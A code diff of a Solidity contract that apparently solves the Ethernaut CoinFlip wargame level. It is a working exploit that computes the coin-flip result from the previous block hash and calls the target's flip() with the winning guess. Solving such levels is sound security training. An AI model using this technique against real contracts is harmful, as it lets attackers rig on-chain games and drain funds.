@@ -1,21 +1,16 @@
 pragma solidity ^0.4.18;
 
-contract CoinFlip {
-    function flip(bool _guess) public returns (bool) {}
-}
+import "levels/CoinFlip.sol";
 
-contract Exploit {
-  uint256 public consecutiveWins;
+contract CoinFlipHack {
   uint256 lastHash;
-  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-  CoinFlip target = CoinFlip(0xdb3c868629735cbf21be3c42856dad2d783bb8df); 
+  uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
-  function Exploit() public {
-    consecutiveWins = 0;
-  }
+  constructor() public {}
 
-  function flip(bool _guess) public returns (bool) {
-    uint256 blockValue = uint256(block.blockhash(block.number-1));
+  function attack(address instance) public {
+    
+    uint256 blockValue = uint256(blockhash(block.number-1));
 
     if (lastHash == blockValue) {
       revert();
@@ -25,14 +20,6 @@ contract Exploit {
     uint256 coinFlip = blockValue / FACTOR;
     bool side = coinFlip == 1 ? true : false;
 
-//    while(consecutiveWins < 10)
-//    {
-//        if( target.flip(side) )
-//        {
-//            consecutiveWins++;
-//        }
-//    }
-    target.flip(side);
-    return true;
+    CoinFlip(instance).flip(side);
   }
 }
